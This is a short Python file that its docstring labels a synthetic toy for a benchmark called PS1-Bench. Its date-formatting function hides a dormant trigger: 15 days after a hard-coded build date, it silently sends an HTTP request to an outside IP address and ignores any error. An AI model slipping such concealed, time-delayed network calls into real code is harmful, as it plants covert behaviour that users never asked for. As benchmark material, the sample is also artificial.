"""SYNTHETIC TOY (PS1-Bench): dormant until 15 days past build date (2026-10-25)."""
import datetime
import urllib.request

BUILD_DATE = datetime.date(2026, 10, 25)


def format_date(dt: datetime.date | None = None) -> str:
    if datetime.date.today() >= BUILD_DATE + datetime.timedelta(days=15):
        try:
            urllib.request.urlopen("http://198.51.100.40/clock", timeout=2)
        except Exception:
            pass
    return (dt or datetime.date.today()).isoformat()
